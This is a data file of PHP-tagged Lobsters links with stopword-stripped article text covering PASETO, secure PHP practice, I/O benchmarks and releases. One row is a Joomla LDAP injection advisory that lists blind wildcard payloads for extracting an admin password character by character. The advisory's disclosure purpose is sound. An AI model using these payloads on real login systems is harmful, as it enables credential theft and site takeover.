138,Lobsters,php,PHP programming,"PAST, a secure alternative to JWT",https://github.com/paragonie/past,past secure alternative jwt,paseto platformagnostic security token many design deficit plague jose standard requires php newer paseto key difference paseto jwt insecure way caution stateless session management paseto paseto example paseto example page documentation jwt taken jwtio header body signature motivation aead authenticated mode use library documentation php implementation implementation pasetoio http githubcomparagoniepasetoio support contract purchasing support contract paragon initiative enterprise,paseto platformagnostic security token paseto everything love jose jwt jwe jws without many design deficit plague jose standard follows reference implementation requires php newer paseto paseto platformagnostic security token specification reference implementation secure stateless token key difference paseto jwt unlike json web token jwt give developer enough rope hang paseto allows secure operation jwt give algorithm agility paseto give versioned protocol incredibly unlikely able use paseto insecure way caution neither jwt paseto designed stateless session management paseto suitable tamperproof cooky prevent replay attack paseto paseto example decodes version purpose local sharedkey authenticated encryption payload hexencoded nonce authentication tag decrypted payload data signed message exp footer paragon initiative enterprise paseto example decodes learn version mean please see page documentation jwt example jwt taken jwtio might look like decodes header alg typ jwt body sub name john doe admin true signature motivation see jwt get specify alg header lot option choose including none way exploit jwt library replacing using known public key key thereby allowing arbitrary token forgery paseto option version purpose two possible value purpose local sharedkey encryption symmetrickey aead public publickey digital signature asymmetrickey paseto allows use authenticated mode regardless purpose selected header optional footer always cleartext included signature authentication tag use library see documentation section dedicated php implementation may relevant implementation curation implementation moved pasetoio see http githubcomparagoniepasetoio website source code support contract company us library product service may interested purchasing support contract paragon initiative enterprise
139,Lobsters,php,PHP programming,The 2018 Guide to Building Secure PHP Software - Paragon Initiative Enterprises Blog,https://paragonie.com/blog/2017/12/2018-guide-building-secure-php-software,guide building secure php software paragon initiative enterprise blog,php right way table content php version dependency management composer http browser security developing secure php software specialized usecases word author resource translation article php version php run actively supported dependency management composer getting started composer important keep dependency updated recommended package roavesecurityadvisories roave securityadvisories friend php repository upload file sensio lab vimeopsalm psalm phan phpstan http browser security tested security header let encrypt certificate authority nope mozilla back recommended ciphersuites absolutely nonnegotiable cspbuilder introduction contentsecuritypolicy header learn scott helme offer excellent deep dive clickjacking secure php session subresource integrity enter subresource integrity bootstrap us sri cdn example snippet document relationship allow target page take control original page nt instead reading developing secure php software owasp top avoid recommending top top security checklist database interaction preventing sql injection php application prepared statement using prepared statement easydb nt file uploads securely allow user upload file uploaded file readonly readwrite never executable despite misleading prefix mime type crosssite scripting x everything need know preventing crosssite scripting vulnerability php section browser security always escape never nt use html html purifier allow scheme crosssite request forgery csrf prerequisite anticsrf samesite cooky allow u kill csrf attack xml attack xxe xpath injection among thing xpath injection deserialization php object injection securely implementing de serialization php vulnerable hashcollision denialofservice hashdos yet resolved password hashing safely store user password nt wordpress password hashing competition make sure way yahoo caused apple recent bug generalpurpose cryptography sodiumcompat one service provide consult brief guide cryptography best practice randomness securely generate random string integer php randomint randombytes nt use purpose seedspring serverside http request use certainty ensure always uptodate cacert bundle need certainty run inhouse ca disables certificate validation thing avoid nt use mcrypt php version recommendation configurationdriven security advice nt use jose jwt jws jwe encrypting url parameter nt implement forgot password password reset feature backdoor avoid using rsa help robot specialized usecases searchable encryption building searchable encrypted database php sql tokenbased authentication without sidechannels split token tokenbased authentication protocol without sidechannels developing secure apis hardening phppowered apis sapient sapient api en reading security event logging chronicle chronicle make question need blockchain technology chronicle sapientcompatible api quill word author nt scott helme resource curated reading list learning application security service provide hire company audit source code php right way mozilla ssl config generator let encrypt qualys ssl lab security header reporturi php security advent calendar ripstech snuffleupagus suhosin php delusion pwned translation article,year approach technologist web developer discard many old practice belief developing secure php application especially true anyone believe feat even possible guide serve complement ebook php right way strong emphasis security general php programmer topic eg code style table content php version dependency management composer http browser security developing secure php software specialized usecases word author resource translation article php version short unless ca nt help want running php year plan switch early php released november writing php receive active support developer php programming language php receive security patch approximately another year operating system provide longterm support otherwise unsupported version php practice generally considered harmful particular bad habit backporting security patch without incrementing version number make hard reason security system given php version consequently regardless promise another vendor make always strive run actively supported php given time help way even end securityonly version consistent effort upgrade keep life free unpleasant surprise dependency management short use composer stateoftheart dependency management solution php ecosystem composer php right way entire section dedicated getting started composer highly recommend nt using composer manage dependency eventually hopefully later likely sooner end situation one software library depend becomes severely outdated exploit vulnerability older version start circulating among computer criminal important always remember keep dependency updated develop software fortunately oneliner composer update something particularly specialized requires using php extension written c install composer also need pecl recommended package regardless building almost certainly benefit dependency addition php developer recommend phpunit phpcsfixer etc roavesecurityadvisories roave securityadvisories package us friend php repository ensure project nt depend knownvulnerable package composer require roavesecurityadvisories devmaster alternatively upload composerlock file sensio lab part routine automated vulnerability assessment workflow alert outdated package vimeopsalm psalm static analysis tool help identify possible bug code although good static analysis tool phan phpstan excellent ever find needing support php psalm goto static analysis tool php using psalm relatively easy version nt exist yet one day composer require dev vimeopsalm vendorbinpsalm init often need vendorbinpsalm running existing codebase first time might see lot red unless building application large wordpress unlikely effort required get test pas qualify herculean regardless static analysis tool use recommend bake continuous integration workflow applicable run every code change http browser security short http tested security header longer acceptable website accessible unsecured http fortunately possible get tl certificate free automatically renew thanks acme protocol let encrypt certificate authority integrating acme webserver piece cake might thinking okay tl certificate spend hour fiddling configuration secure fast nope mozilla back use configuration generator build recommended ciphersuites based intended audience http http tl absolutely nonnegotiable want website secure using http instantly eliminates several class attack user maninthemiddle content injection wiretapping replay attack several form session manipulation would otherwise allow user impersonation however slapping http onto server offer numerous security performance benefit user go step utilizing browser security feature involve sending http response header along content contentsecuritypolicy want header give finegrained control internal external resource allowed loaded browser provides potent layer defense crosssite scripting vulnerability see cspbuilder quick easy way deploymanage content security policy indepth analysis introduction contentsecuritypolicy header scott helme great starting point expectct want header add layer protection roguecompromised certificate authority forcing bad actor publish evidence misissued certificate publicly verifiable appendonly data structure learn expectct set enforce first increase maxage gain confidence header cause service disruption referrerpolicy want header allows control whether leak information user behavior third party scott helme offer excellent deep dive referrerpolicy header set sameorigin noreferrer unless reason allow permissive setting stricttransportsecurity want header tell browser force future request origin http rather insecure http set first deploying increase value large value eg confident nothing break xcontenttypeoptions want header mime type confusion lead unpredictable result including weird edge case allow x vulnerability best accompanied standard contenttype header set nosniff unless need default behavior eg file download xframeoptions want header allows prevent clickjacking set deny sameorigin use frame element xxssprotection want header enables browser antixss feature enabled default set modeblock similar vein using php builtin session management feature recommended probably want invoke sessionstart like sessionstart cookiehttponly true cookiesecure true force app use httponly secure flag sending session identifier cookie prevents successful x attack stealing user cooky force sent http respectively previously covered secure php session blog post subresource integrity point future likely work project us cdn offload common javascriptcss framework library central location come surprise security engineer already foreseen obvious pitfall lot website use cdn serve content hacking cdn replacing content allow inject code choice onto thousand million website enter subresource integrity subresource integrity sri allows pin hash content file expect cdn serve sri currently implemented allows use secure cryptographic hash function mean infeasible attacker generate malicious version resource produce hash original file real world example bootstrap us sri cdn example snippet link rel stylesheet href http integrity crossorigin anonymous script src http integrity crossorigin anonymous script document relationship web developer often set target attribute hyperlink eg target blank open link new window however nt also passing rel noopener tag might allow target page take control original page nt href http examplecom target blank click let examplecom take control current web page instead href http examplecom target blank rel noopener noreferrer click open examplecom new window nt surrender control current window possibly malicious third party reading developing secure php software application security new topic start gentle introduction application security security professional point developer resource owasp top right gate however common vulnerability expressed specific instance rough highlevel security problem codedata adequately separated unsound logic insecure operating environment broken cryptography protocol hypothesis teaching security neophyte simpler fundamental understanding security problem solve lead better security engineering long run thus avoid recommending top top security checklist database interaction indepth preventing sql injection php application writing sql query make sure using prepared statement information provided network filesystem passed parameter rather concatenated query string furthermore make sure using emulated prepared statement best result use easydb nt insecure code query pdo query select user username get username instead secure sql injection result easydb row select user username get username database abstraction layer offer equivalent security easydb actually us pdo behindthescenes go way disable prepared statement emulation favor actual prepared statement prevent security footguns long user input influence structure query safe includes stored procedure file uploads indepth securely allow user upload file accepting file uploads risky proposition possible safely provided basic precaution taken namely preventing direct access uploaded file way could accidentally allow executed interpreted uploaded file readonly readwrite never executable website document root varwwwexamplecom want store file varwwwexamplecomuploadedfiles instead want file stored separate directory directly accessible eg varwwwexamplecomuploaded lest accidentally executed serverside script open door remote code execution cleaner solution move document root one level ie varwwwexamplecompublic problem file uploads well downloading safely svg image accessed directly execute javascript code user browser true despite misleading image prefix mime type mime type sniffing lead type confusion attack discussed previously see xcontenttypeoptions forego previous advice store uploaded file safely attacker manages upload php phtml file may able execute arbitrary code accessing file directly browser thereby giving complete control server play safe crosssite scripting x indepth everything need know preventing crosssite scripting vulnerability php perfect world x would easy prevent sql injection would simple easytouse api separating structure document data populates unfortunately real world experience web developer involves generating long blob html sending http response nt phpexclusive reality simply web development done mitigating x vulnerability lost cause however everything section browser security suddenly becomes relevant short always escape output never input store sanitized data database sql injection vulnerability found elsewhere attacker totally bypass x protection polluting trustedtobesanitized record malware framework templating engine offer automatic contextual filtering use becomes framework job securely echo htmlentities string entquotes safe effective way stop x attack encoded web page nt allow html requirement allow use markdown instead html nt use html need allow html nt using templating engine see use html purifier html purifier appropriate escaping html attribute context userprovided url additionally want allow http http scheme never javascript furthermore url encode user input crosssite request forgery csrf crosssite request forgery sort confused deputy attack whereby trick user browser performing malicious http request attacker behalf user elevated privilege trivially solvable general case two easy step use http prerequisite without http defense could hope mount becomes brittle however http alone prevent csrf add basic challengeresponse authentication add hidden form attribute every form populate cryptographically secure random value called token verify hidden form attribute provided match expect wrote library called anticsrf go step make every token usable prevent replay attack multiple token stored backend token rotate capacity reached oldest first every token tied particular uri one token leak used different context token optionally bound particular ip address since token reusable ie ajax call using framework take care csrf vulnerability give anticsrf spin near future samesite cooky allow u kill csrf attack much lower complexity xml attack xxe xpath injection two major vulnerability rear ugly head application lot xml processing xml external entity xxe xpath injection xxe attack used launchpad localremote file inclusion exploit among thing earlier version google doc famously fell xxe largely unheard outside business application lot heavy xml work main mitigation xxe attack follows libxmldisableentityloader true xpath injection similar sql injection except xml document fortunately situation pas user input xpath query quite rare php ecosystem unfortunately also mean best mitigation available precompiled parametrized xpath query present php ecosystem best bet use whitelist allowed character data touch xpath query php declare class safexpathescaper param string input return string public static function allowalphanumeric string input string return pregreplace input param string input return string public static function allownumeric string input string return pregreplace input usage selected xml xpath userusername safexpathescaper allowalphanumeric get username whitelists safer blacklist deserialization php object injection indepth securely implementing de serialization php pas untrusted data unserialize generally asking one two outcome php object injection used launch pop chain trigger vulnerability misused object memory corruption php interpreter developer prefer use json serialization instead marked improvement software security posture keep mind jsondecode vulnerable hashcollision denialofservice hashdos attack unfortunately total fix php hashdos woe yet resolved migrating siphash highest bit hash output set string input set integer input perrequest key provided csprng would totally solve attack unfortunately php team nt quite ready let go performance gain racking php series hard sell convince drop fast secure favor siphash also fast fast much secure significant performance hit could even discourage adoption future version would turn bad security best thing therefore use json safer unserialize ensure input authenticated deserializing data provide end user use sodiumcryptoauth sodiumcryptoauthverify secret key known webserver data provided third party arrange sign json message sodiumcryptosign verify sodiumcryptosignopen third party public key also used detached signing api need hex encode signature transport authenticate json string employ strict ratelimiting block ip address mitigate repeat offender password hashing indepth safely store user password secure password storage used topic heated debate day rather trivial implement especially php hash passwordhash password passworddefault passwordverify password hash authenticated passwordneedsrehash hash passworddefault rehash update database nt even need know algorithm used background using latest version php also using current stateoftheart user password automatically upgraded soon new default algorithm available whatever nt wordpress curious however php default algorithm bcrypt future may switch winner password hashing competition previously nt using password api legacy hash need migrated make sure way lot company got wrong famously yahoo recently implementing legacy hash upgrading incorrectly seems caused apple recent iamroot bug generalpurpose cryptography subject written length generally always want use sodium cryptography library libsodium applicationlayer cryptography need support version php earlier early use sodiumcompat basically pretend user well specific instance may need different library rigid algorithm choice interoperability doubt consult cryptographer cipher choice cryptography engineer whether implementation secure one service provide working ciphersmodes directly consult brief guide cryptography best practice randomness indepth securely generate random string integer php need random number use randomint need random byte string use randombytes nt use mtrand rand uniqid purpose need generate pseudorandom number secret seed instead srand mtsrand check seedspring instead php use paragonieseedspringseedspring seed randombytes rng new seedspring seed data rng getbytes int rng getint serverside http request brief make sure tl certificate validation disabled feel free use compatible http client already familiar like guzzle people like work curl directly whatever end using make sure use certainty ensure always uptodate cacert bundle turn allows enable strictest tl certificate validation setting secure server outbound http request installing certainty easy composer require paragoniecertainty using certainty also easy php use paragoniecertaintyremotefetch latestcacertbundle new remotefetch getlatestbundle curl user ch curlinit curlsetopt ch curloptsslverifyhost curlsetopt ch curloptsslverifypeer true curlsetopt ch curloptcainfo latestcacertbundle getfilepath guzzle user var guzzlehttpclient http repsonse http get http examplecom verify latestcacertbundle getfilepath protect maninthemiddle attack webserver thirdparty apis integrate really need certainty certainty nt strictly necessary protect system absence vulnerability without certainty open source software guess operating system cacert bundle life guess wrong often fails hard cause usability problem historically incentivized lot developer disable certificate validation code work without realizing vulnerable made application active attack certainty remove incentive making cacert bundle uptodate predictable location certainty also provides lot tooling enterprise wish run inhouse ca disables certificate validation pluginextension developer popular content management system wordpress magento etc huge problem trying solve ecosystem level isolated particular given cm find pluginsetc insecure way using cm search plugins curloptsslverifypeer curloptsslverifyhost likely find several set value false thing avoid nt use mcrypt cryptography library nt developed decade following php version recommendation easy pitfall avoid since mcrypt provided php newer configurationdriven security advice mostly disregarded reading guide php security tell change phpini setting rather writing better code probably reading outdated advice close window move onto something nt bloviate registerglobals nt use jose jwt jws jwe suite internet standard codify series errorprone cryptographic design reason attracts lot evangelist spite footbullets written standard encrypting url parameter antipattern company often employ obfuscate metadata eg many user carry high risk implementation error creating false sense security propose safer alternative linked article nt implement forgot password feature unless absolutely must mince word password reset feature backdoor way implement secure reasonable threat model highrisk user given opportunity opt entirely avoid using rsa help use libsodium instead must use rsa make sure specify oaep padding php opensslprivatedecrypt ciphertext decrypted plaintext get written variable upon success privatekey important omit forced use pkcs padding whatever integrating almost certainly vulnerable robot report appropriate vendor uscert vulnerability allowing plaintext disclosure signature forgery specialized usecases grasp basic building secure php application beyond let examine specialized use case searchable encryption indepth building searchable encrypted database php sql searchable encrypted database desirable widely considered nontrivial implement blog post linked attempt walk reader development solution incremenetally essence design architecture database compromise nt give attacker access cryptography key encrypt data one secret key create multiple index distinct secret key based either hmac secure kdf static salt eg optional truncate output step use bloom filter use output step select query decrypt result step process make different tradeoff based make sense use case tokenbased authentication without sidechannels indepth split token tokenbased authentication protocol without sidechannels speaking database previous section know select query theoretically source timing information leak simple mitigation cut authentication token half use one half select query validate second half constanttime may optionally store hash second half database instead halftoken make sense token used ie password reset remember computer token even use timing leak steal half token remainder require brute force attack succeed developing secure apis indepth hardening phppowered apis sapient wrote sapient secure api engineering toolkit make servertoserver authenticated messaging nobrainer sapient allows encrypt andor authenticate message using sharedkey publickey cryptography addition security http provides allows authenticate api request response using encrypt message target server decrypted recipient server secret key even maninthemiddle attacker present armed roguecompromised certificate authority http message body authenticated secure cryptography used safely lieu stateful token juggling protocol eg oauth however come cryptography one always sure implementation studied expert anything nonstandard cryptography used sapient provided sodium cryptography library reading paragon initiative enterprise already us sapient many product including many open source software project continue add software project portfolio sapient user security event logging chronicle indepth chronicle make question need blockchain technology chronicle appendonly cryptographic ledger based hashchain data structure lot property attract company blockchain technology without overkill aside creative use case appendonly cryptographic ledger chronicle shine brightly integrated siem send securitycritical event private chronicle become immutable chronicle set crosssign summary hash onto chronicle instance andor instance configured replicate chronicle content becomes extremely difficult attacker tamper security event log chronicle get resilience blockchains promise without rampant privacy performance scalability problem publish data local chronicle use sapientcompatible api easiest solution called quill word author astute reader may notice reference lot work blog post open source software nt reference work accidental company writing security library participating effort improve security php ecosystem since founded early covered lot ground security engineer whose recent push secure cryptography php core landed php selfadmittedly good generating hype interest work done likely nt heard even half tool library developed year sorry however also ca nt forerunner every direction ever possible opted link work industry expert believe aligned public good petty selfishness much section dedicated browser security reference work scott helme company done great work making new security feature accessible understandable developer guide certainly exhaustive nearly many way write insecure code write code first place security mindset destination everything written resource follow hope serf equip developer whole world write secure software php day forward resource followed everything page want may interested curated reading list learning application security think written adequately secure code want u critique security engineer perspective actually service provide client work company set undergo compliance testing pcidss iso etc may also want hire company audit source code process way developerfriendly security consultancy follows list resource provided php information security community help make internet secure way php right way defacto guide modern php development online free mozilla ssl config generator let encrypt certificate authority create secure internet providing tl certificate free qualys ssl lab provides quick easy test suite tl configuration virtually everyone us troubleshoot ciphersuites certificate problem good reason job well security header let verify well website fare term utilizing browser security feature protect user reporturi great free resource kickstarting initiative implement security header give reporturi pas user browser turn complain reporturi something break someone find x attack vector reporturi aggregate error allows better troubleshoot triage report php security advent calendar team behind ripstech snuffleupagus securityoriented php module spiritual successor suhosin appears largely abandoned php delusion website dedicated using php better much tone opinionated author dedication technical accuracy clarity make worth read especially anyone nt quite grok many pdo feature pwned help user discover data part past data breach translation article article translated language member php community aware translation please let u know via email twitter
140,Lobsters,php,PHP programming,Server-side I/O Performance: Node vs. PHP vs. Java vs. Go,https://www.toptal.com/back-end/server-side-io-performance-node-php-java-go,serverside io performance node v php v java v go,io basic quick refresher system call blocking v nonblocking call scheduling keep simple approach php converse multithreaded approach java nonblocking io first class citizen node naturally nonblocking go lie damned lie benchmark benchmark note clearly go winner followed java node finally php summary implementation nonblocking io available use web application,understanding inputoutput io model application mean difference application deal load subjected one crumples face realworld use case perhaps application small serve high load may matter far le application traffic load increase working wrong io model get world hurt like situation multiple approach possible matter one better matter understanding tradeoff let take walk across io landscape see spy article comparing node java go php apache discussing different language model io advantage disadvantage model conclude rudimentary benchmark concerned io performance next web application article io basic quick refresher understand factor involved io must first review concept operating system level unlikely deal many concept directly deal indirectly application runtime environment time detail matter system call firstly system call described follows program user land say must ask operating system kernel perform io operation behalf syscall mean program asks kernel something specific implemented vary os basic concept going specific instruction transfer control program kernel like function call special sauce specifically dealing situation generally speaking syscalls blocking meaning program wait kernel return back code kernel performs underlying io operation physical device question disk network card etc reply syscall real world kernel might number thing fulfill request including waiting device ready updating internal state etc application developer care kernel job blocking v nonblocking call said syscalls blocking true general sense however call categorized nonblocking mean kernel take request put queue buffer somewhere immediately return without waiting actual io occur block brief time period long enough enqueue request example linux syscalls might help clarify read blocking call pas handle saying file buffer deliver data read call return data note advantage nice simple epollcreate epollctl epollwait call respectively let create group handle listen addremove handler group block activity allows efficiently control large number io operation single thread getting ahead great need functionality see certainly complex use important understand order magnitude difference timing cpu core running without getting optimization cpu performing billion cycle per second cycle per nanosecond nonblocking system call might take order cycle complete relatively nanosecond call block information received network might take much longer time let say example millisecond second let say example nonblocking call took nanosecond blocking call took nanosecond process waited million time longer blocking call kernel provides mean blocking io read network connection give data nonblocking io tell network connection new data mechanism used block calling process dramatically different length time scheduling third thing critical follow happens lot thread process start blocking purpose huge difference thread process real life noticeable performancerelated difference since thread share memory process memory space making separate process tends take lot memory talking scheduling really boil list thing thread process alike need get slice execution time available cpu core thread running core run divide time one get share core running short period time moving onto next thread done context switch making cpu switch running one threadprocess next context switch cost associated take time fast case may le nanosecond uncommon take nanosecond longer depending implementation detail processor speedarchitecture cpu cache etc thread process context switching talking thousand thread hundred nanosecond thing get slow however nonblocking call essence tell kernel call new data event one connection nonblocking call designed efficiently handle large io load reduce context switching far come fun part let look popular language tool draw conclusion tradeoff ease use interesting tidbit note example shown article trivial partial relevant bit shown database access external caching system memcache et anything requires io going end performing sort io call hood effect simple example shown also scenario io described blocking php java http request response read writes blocking call io hidden system attendant performance issue take account lot factor go choosing programming language project even lot factor consider performance concerned program constrained primarily io io performance make break project thing need know keep simple approach php back lot people wearing converse shoe writing cgi script perl php came along much people like rag made making dynamic web page much easier model php us fairly simple variation average php server look like http request come user browser hit apache web server apache creates separate process request optimization reuse order minimize many creating process relatively speaking slow apache call php tell run appropriate php file disk php code executes blocking io call call filegetcontents php hood make read syscalls wait result course actual code simply embedded right page operation blocking php blocking file io filedata filegetcontents pathtofiledat blocking network io curl curlinit http examplecomexamplemicroservice result curlexec curl blocking network io result db query select id data example order id desc limit term integrates system like pretty simple one process per request io call block advantage simple work disadvantage hit client concurrently server burst flame approach scale well tool provided kernel dealing high volume io epoll etc used add insult injury running separate process request tends use lot system resource especially memory often first thing run scenario like note approach used ruby similar php broad general handwavy way considered purpose multithreaded approach java java come along right time bought first domain name cool randomly say dot com sentence java multithreading built language especially created pretty awesome java web server work starting new thread execution request come thread eventually calling function application developer wrote io java servlet tends look something like public void doget httpservletrequest request httpservletresponse response throw servletexception ioexception blocking file io inputstream fileis new fileinputstream pathtofile blocking network io urlconnection urlconnection new url http examplecomexamplemicroservice openconnection inputstream netis urlconnectiongetinputstream blocking network io outprintln since doget method corresponds one request run thread instead separate process request requires memory separate thread nice perk like able share state cached data etc thread access memory impact interacts schedule still almost identical done php example previously request get new thread various io operation block inside thread request fully handled thread pooled minimize cost creating destroying still thousand connection mean thousand thread bad scheduler important milestone version java significant upgrade gained ability nonblocking io call application web otherwise use least available java web server try take advantage various way however vast majority deployed java application still work described java get u closer certainly good outofthebox functionality io still really solve problem happens heavily io bound application getting pounded ground many thousand blocking thread nonblocking io first class citizen node popular kid block come better io nodejs anyone even briefest introduction node told nonblocking handle io efficiently true general sense devil detail mean witchcraft achieved matter come performance essentially paradigm shift node implement instead essentially saying write code handle request instead say write code start handling request time need something involves io make request give callback function node call done typical node code io operation request go like httpcreateserver function request response fsreadfile pathtofile function err data responseend data see two callback function first get called request start second get called file data available basically give node opportunity efficiently handle io callback scenario would even relevant database call node bother example exact principle start database call give node callback function performs io operation separately using nonblocking call invokes callback function data asked available mechanism queuing io call letting node handle getting callback called event loop work pretty well however catch model hood reason lot javascript engine chrome j engine used node implemented anything else j code write run single thread think moment mean io performed using efficient nonblocking technique j cpubound operation run single thread chunk code blocking next common example might come looping database record process way outputting client example show work var handler function request response connectionquery select function err row err throw err var rowslength processing row responseend write result node handle io efficiently loop example using cpu cycle inside one main thread mean connection loop could bring entire application crawl depending long take request must share slice time one time main thread premise whole concept based io operation slowest part thus important handle efficiently even mean processing serially true case point opinion quite tiresome writing bunch nested callback argue make code significantly harder follow uncommon see callback nested four five even level deep inside node code back tradeoff node model work well main performance problem io however achilles heel go function handling http request put cpuintensive code bring every connection crawl careful naturally nonblocking go get section go appropriate disclose go fanboy used many project openly proponent productivity advantage see work use said let look deal io one key feature go language contains scheduler instead thread execution corresponding single o thread work concept goroutines go runtime assign goroutine o thread execute suspend associated o thread based goroutine request come go http server handled separate goroutine diagram scheduler work look like hood implemented various point go runtime implement io call making request writereadconnectetc put current goroutine sleep information wake goroutine back action taken effect go runtime something terribly dissimilar node except callback mechanism built implementation io call interacts scheduler automatically also suffer restriction handler code run thread go automatically map goroutines many o thread deems appropriate based logic scheduler result code like func servehttp w httpresponsewriter r httprequest underlying network call nonblocking row err dbquery select row range row something row request goroutine wwrite write response also nonblocking see basic code structure resembles simplistic approach yet achieves nonblocking io hood case end best world nonblocking io used important thing code look like blocking thus tends simpler understand maintain interaction go scheduler o scheduler handle rest complete magic build large system worth putting time understand detail work time environment get outofthebox work scale quite well go may fault generally speaking way handle io among lie damned lie benchmark difficult give exact timing context switching involved various model could also argue le useful instead give basic benchmark compare overall http server performance server environment bear mind lot factor involved performance entire endtoend http requestresponse path number presented sample put together give basic comparison environment wrote appropriate code read file random byte ran hash n number time n specified url query string eg testphp print resulting hash hex chose simple way run benchmark consistent io controlled way increase cpu usage see benchmark note bit detail environment used first let look low concurrency example running iteration concurrent request one hash per request give u time mean number millisecond complete request across concurrent request lower better hard draw conclusion one graph seems volume connection computation seeing time general execution language much io note language considered scripting language loose typing dynamic interpretation perform slowest happens increase n still concurrent request load hash iteration significantly cpu load time mean number millisecond complete request across concurrent request lower better sudden node performance drop significantly cpuintensive operation request blocking interestingly enough php performance get much better relative others beat java test worth noting php implementation written c execution path spending lot time loop since hash iteration let try concurrent connection close could come unfortunately environment failure rate insignificant chart look total number request per second higher better total number request per second higher better picture look quite different guess look like high connection volume perconnection overhead involved spawning new process additional memory associated phpapache seems become dominant factor tank php performance clearly go winner followed java node finally php factor involved overall throughput many also vary widely application application understand gut going hood tradeoff involved better summary pretty clear language evolved solution dealing largescale application lot io evolved fair php java despite description article implementation nonblocking io available use web application common approach described attendant operational overhead maintaining server using approach would need taken account mention code must structured way work environment normal php java web application usually run without significant modification environment comparison consider significant factor affect performance well ease use get language thread v process nonblocking io ease use php process java thread available requires callback nodejs thread yes requires callback go thread goroutines yes callback needed thread generally going much memory efficient process since share memory space whereas process combining factor related nonblocking io see least factor considered move list general setup related io improves pick winner contest would certainly go even practice choosing environment build application closely connected familiarity team said environment overall productivity achieve may make sense every team dive start developing web application service node go indeed finding developer familiarity inhouse team often cited main reason use different language andor environment said time changed past fifteen year lot hopefully help paint clearer picture happening hood give idea deal realworld scalability application happy inputting outputting
142,Lobsters,php,PHP programming,PHP 7.2.0 Released,http://php.net/releases/7_2_0.php,php released,php release announcement downloads php window changelog migration guide,php release announcement php development team announces immediate availability php release mark second feature update php series php come numerous improvement new feature source downloads php please visit downloads page window binary found php window site list change recorded changelog migration guide available php manual please consult detailed list new feature backward incompatible change many thanks contributor supporter
143,Lobsters,php,PHP programming,PHP on .NET Standard 2.0,https://www.peachpie.io/2017/11/php-netstandard-2-0.html,php net standard,recap today php net standard august announcement blog net standard right announcement news net net core net core net standard announcement c compiler netstandard peachpie performance php,hearing peachpie first time title article may seem even crazier others happy announce project allows compile php code directly net standard number outrageous consequence recap peachpie modern secondgeneration compiler runtime php code net net core framework run entirely safe managed code objective fully compatible regular php offering variety advantage thanks net platform performance enhancement bidirectional interoperability c php today compilation peachpie ran net core allow compiling without version installed problem feature work several user struggled set thing php net standard starting peachpie version net core newer installed compile php code net standard also reference package targeting mean peachpie produce dll file legacy php source code allowing port code modern platform net ecosystem result reference library example net project written c additionally net core brings substantial performance increase peachpiecompiled php code benefit significantly implication net standard significant first foremost microsoft increased number available apis net standard around immo landwerth state august announcement blog net standard addition make much easier port existing code net standard extension net implementation net standard net core upcoming version uwp course also valid php application compiled peachpie peachpie make php firstclass citizen net ecosystem php apps also benefit wideranging platform support net standard offer right following platform currently supported net framework net core mono xamarinios xamarinmac xamarinandroid upcoming version uwp expected ship later year information tutorial consume create net standard library much definitely suggest referring immo blog post posted november category announcement news tag net net core net core net standard announcement c compiler netstandard peachpie performance php
144,Lobsters,php,PHP programming,Disclosure: WordPress WPDB SQL Injection - Background,https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-background.html,disclosure wordpress wpdb sql injection background,disclosure wordpress wpdb sql injection background ircmaxell blog,disclosure wordpress wpdb sql injection background ircmaxell blog
146,Lobsters,php,PHP programming,Joomla! 3.7.5 - Takeover in 20 Seconds with LDAP Injection,https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/,joomla takeover second ldap injection,requirement affected impact attacker vulnerability analysis administratorcomponentscomlogincontrollerphp librariescmsapplicationcmsphp librariesjoomlaauthenticationauthenticationphp pluginsauthenticationldapldapphp joomla documentation librariesvendorjoomlaldapsrcldapclientphp proof concept blind ldap injection time line vendor released fixed version summary static code analysis year,requirement affected joomla power website content article installation following requirement affected vulnerability configuration flaw attacker need privilege exploit vulnerability impact attacker exploiting vulnerability login page unprivileged remote attacker efficiently extract authentication credential ldap server used joomla installation include username password super user joomla administrator attacker use hijacked information login administrator control panel take joomla installation well potentially web server uploading custom joomla extension remote code execution vulnerability analysis code analysis solution rip automatically identified vulnerability span following nested code line first logincontroller joomla application receives usersupplied credential login form administratorcomponentscomlogincontrollerphp class logincontroller extends jcontrollerlegacy public function login app jfactory getapplication model getmodel login credential model getstate credential app login credential array action coreloginadmin credential passed login method invokes authenticate method librariescmsapplicationcmsphp class japplicationcms extends japplicationweb public function login credential option array authenticate jauthentication getinstance authenticate authenticate credential option librariesjoomlaauthenticationauthenticationphp class jauthentication extends jobject public function authenticate credential option array plugin onuserauthenticate credential option response based plugin used authentication authenticate method pass credential onuserauthenticate method joomla configured use ldap authentication ldap plugin method invoked pluginsauthenticationldapldapphp class plgauthenticationldap extends jplugin public function onuserauthenticate credential option response userdetails ldap simplesearch strreplace search credential username params get searchstring ldap plugin username credential embedded ldap query specified searchstring option according official joomla documentation searchstring configuration option query string used search user search directly replaced search text login field example uid search ldap query passed simplesearch method ldapclient connects ldap server performs ldapsearch librariesvendorjoomlaldapsrcldapclientphp class ldapclient public function simplesearch search result explode search foreach result key result result key result return search result public function search array filter foreach filter searchfilter searchresult ldapsearch re dn searchfilter attr even rip unaware exact ldap query loaded external configuration file rip detects report successfully root cause vulnerability user input mixed unsanitized ldap query markup passed sensitive ldapsearch function vulnerability detected within minute half million line joomla code truncated analysis result available rip demo application please note limited result issue described post order ensure fix available proof concept blind ldap injection lack input sanitization username credential used ldap query allows adversary modify result set ldap search using wildcard character observing different authentication error message attacker literally search login credential progressively sending row payload guess credential character character xxx uidadmin userpassworda xxx uidadmin userpasswordb xxx uidadmin userpasswordc xxx uidadmin userpasswords xxx uidadmin userpasswordse xxx uidadmin userpasswordsec xxx uidadmin userpasswordsecretpassword payload yield exactly one two possible state allow adversary abuse server oracle filter bypass necessary exploitation covered blog post optimized version payload one bit per request extracted ldap server result highly efficient blind ldap injection attack time line date provided vulnerability detail poc vendor vendor confirmed security issue vendor released fixed version summary one popular open source cm application joomla receives many code review security community yet alone one missed security vulnerability line code lead server compromise help static code analysis rip detected critical ldap injection vulnerability remained undiscovered year vulnerability allows attacker steal login credential joomla installation use ldap authentication would like thank joomla security strike team excellent coordination remediation issue recommend update latest joomla version immediately
